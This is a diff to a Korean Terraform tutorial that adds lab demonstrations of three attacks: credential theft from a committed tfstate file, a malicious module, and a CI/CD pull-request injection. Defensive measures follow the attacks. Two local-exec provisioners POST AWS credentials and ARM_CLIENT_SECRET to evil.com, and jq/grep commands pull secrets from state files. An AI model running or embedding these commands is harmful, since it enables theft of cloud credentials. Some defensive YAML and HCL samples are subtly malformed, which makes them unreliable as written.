@@ -165,15 +165,122 @@ ssh azureuser@10.0.1.4
 
 ---
 
-## 6. 보안: State 파일 관리
+## 6. 보안 고려사항
 
 Terraform의 `terraform.tfstate` 파일에는 **민감한 정보가 평문으로 저장**된다. 데이터베이스 비밀번호, 서비스 주체(App ID/Secret), SSH 키 등이 노출될 위험이 있다.
 
-### 위험성
-*   **로컬 저장 시**: Git에 실수로 커밋하면 비밀번호가 공개 저장소에 영구히 남는다.
-*   **팀 협업 시**: 여러 명이 각자 다른 State를 가지면 리소스 충돌이 발생한다.
+### 6.1. 공격 시연 (Lab 환경)
 
-### 권장 사항: Remote Backend 사용
+#### 공격 1: State 파일에서 비밀번호 탈취
+
+`.tfstate` 파일이 Git 저장소에 커밋되거나 공유 스토리지에 무방비로 저장된 경우, 공격자가 민감 정보를 추출하는 시나리오이다.
+
+**[취약한 환경]**
+*   `.tfstate` 파일이 Git에 커밋됨
+*   Remote Backend 미사용 (로컬 저장)
+
+**[공격 과정]**
+```bash
+# 1. Git 저장소에서 tfstate 파일 발견
+find . -name "*.tfstate"
+
+# 2. State 파일에서 비밀번호 검색
+cat terraform.tfstate | jq '.resources[] | select(.type=="azurerm_sql_server") | .instances[].attributes.administrator_login_password'
+# 출력: "P@ssw0rd123!"
+
+# 3. 서비스 주체(Service Principal) 정보 탈취
+grep -i "client_secret" terraform.tfstate
+# 출력: "client_secret": "xxxxx-secret-xxxxx"
+
+# 4. 탈취한 자격 증명으로 Azure 로그인
+az login --service-principal -u <client_id> -p <client_secret> --tenant <tenant_id>
+# 클라우드 인프라 완전 장악
+```
+
+**[공격 결과]**: State 파일 노출 → 클라우드 자격 증명 탈취 → 인프라 장악 🔓
+
+---
+
+#### 공격 2: 악성 Provider/Module 공급망 공격
+
+공격자가 조작된 Terraform Provider나 Module을 공개 레지스트리에 업로드하여, 피해자가 이를 사용하면 백도어가 설치되는 시나리오이다.
+
+**[취약한 환경]**
+*   비공식 Provider/Module 무분별하게 사용
+*   Provider 버전 Pin 없이 `latest` 사용
+
+**[공격 과정]**
+```hcl
+# 피해자의 main.tf (악성 모듈 사용)
+module "eks" {
+  source  = "evil-hacker/eks-backdoor/aws"  # 악성 모듈
+  version = "~> 1.0"  # 최신 버전 자동 설치
+}
+```
+
+```bash
+# 악성 모듈 내부에 숨겨진 코드
+# 1. terraform apply 시 공격자 서버로 자격 증명 전송
+resource "null_resource" "exfil" {
+  provisioner "local-exec" {
+    command = "curl -X POST https://evil.com/collect -d @~/.aws/credentials"
+  }
+}
+```
+
+**[공격 결과]**: 악성 Module 사용 → AWS 자격 증명 탈취 🔓
+
+---
+
+#### 공격 3: CI/CD 파이프라인의 Terraform 권한 악용
+
+GitHub Actions 등에서 Terraform을 실행하는 경우, 워크플로우 설정이 취약하면 공격자가 PR을 통해 악성 코드를 실행할 수 있다.
+
+**[취약한 환경]**
+*   `pull_request_target` 이벤트에서 Terraform 실행
+*   PR 머지 전 `terraform apply` 실행
+
+**[공격 과정]**
+```yaml
+# 취약한 GitHub Actions 워크플로우
+on:
+  pull_request_target:  # 외부 PR에서도 Secrets 접근 가능
+    branches: [main]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: terraform apply -auto-approve
+        env:
+          ARM_CLIENT_SECRET: ${{ secrets.ARM_CLIENT_SECRET }}  # 악용 가능
+```
+
+```hcl
+# 공격자가 PR로 제출한 악성 코드
+resource "null_resource" "backdoor" {
+  provisioner "local-exec" {
+    command = "echo $ARM_CLIENT_SECRET | curl -X POST https://evil.com/steal -d @-"
+  }
+}
+```
+
+**[공격 결과]**: 취약한 CI/CD → Secrets 탈취 → 인프라 장악 🔓
+
+---
+
+### 6.2. 방어 대책
+
+| 공격 | 방어 |
+|:---|:---|
+| State 파일 탈취 | 방어 1, 2, 3 |
+| 공급망 공격 | 방어 4, 5 |
+| CI/CD 악용 | 방어 6 |
+
+---
+
+#### 방어 1: Remote Backend 사용 (필수)
+
 State 파일을 로컬이 아닌 클라우드 저장소에 저장하여 암호화하고 협업 시 동기화한다.
 
 ```hcl
@@ -188,9 +295,108 @@ terraform {
 }
 ```
 
-### 추가 보안 조치
-1.  **`.gitignore`에 추가**: `*.tfstate`, `*.tfstate.*` 파일을 Git 추적에서 제외한다.
-2.  **Storage 암호화**: Azure Storage는 기본적으로 서버 측 암호화(SSE)가 적용되지만, Customer-Managed Key를 사용하면 더 강력하다.
-3.  **State Locking**: 동시 실행 방지를 위해 Backend에서 Lock 기능을 활성화한다.
+---
+
+#### 방어 2: .gitignore 설정
+
+State 파일이 절대 Git에 커밋되지 않도록 설정한다.
+
+```gitignore
+# .gitignore
+*.tfstate
+*.tfstate.*
+*.tfvars
+.terraform/
+```
+
+---
+
+#### 방어 3: State Locking 및 암호화
+
+동시 실행 방지와 저장 시 암호화를 적용한다.
+
+```hcl
+# Azure Storage에서 Lock 자동 지원
+# AWS S3 + DynamoDB 사용 시
+terraform {
+  backend "s3" {
+    bucket         = "terraform-state-bucket"
+    key            = "prod/terraform.tfstate"
+    region         = "ap-northeast-2"
+    encrypt        = true                    # 암호화
+    dynamodb_table = "terraform-state-lock"  # Lock 테이블
+  }
+}
+```
+
+---
+
+#### 방어 4: Provider/Module 버전 Pin
+
+공급망 공격 방지를 위해 정확한 버전과 해시를 고정한다.
+
+```hcl
+terraform {
+  required_providers {
+    azurerm = {
+      source  = "hashicorp/azurerm"
+      version = "= 3.75.0"  # 정확한 버전 고정
+    }
+  }
+}
+
+# .terraform.lock.hcl 파일을 Git에 커밋하여 해시 검증
+```
+
+---
+
+#### 방어 5: 신뢰할 수 있는 소스만 사용
+
+공식 레지스트리(registry.terraform.io)의 Verified 마크가 있는 Provider/Module만 사용한다.
+
+```hcl
+# ✅ 안전: HashiCorp 공식 Provider
+provider "azurerm" {
+  source = "hashicorp/azurerm"
+}
+
+# ❌ 위험: 출처 불명의 Provider
+provider "azurerm" {
+  source = "unknown-user/azurerm-fork"
+}
+```
+
+---
+
+#### 방어 6: CI/CD 보안 강화
+
+PR에서는 `plan`만 실행하고, `apply`는 머지 후 protected branch에서만 실행한다.
+
+```yaml
+# 안전한 GitHub Actions 워크플로우
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  plan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Terraform Plan (PR에서는 apply 금지)
+        run: terraform plan -out=plan.tfplan
+        # apply는 main 브랜치 push 이벤트에서만 실행
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - run: terraform apply -auto-approve
+```
+
+> **Tip**: **OIDC(OpenID Connect)**를 사용하면 CI/CD에서 장기 Secrets 대신 임시 토큰으로 인증하여 더 안전하다.
 
 <hr class="short-rule">
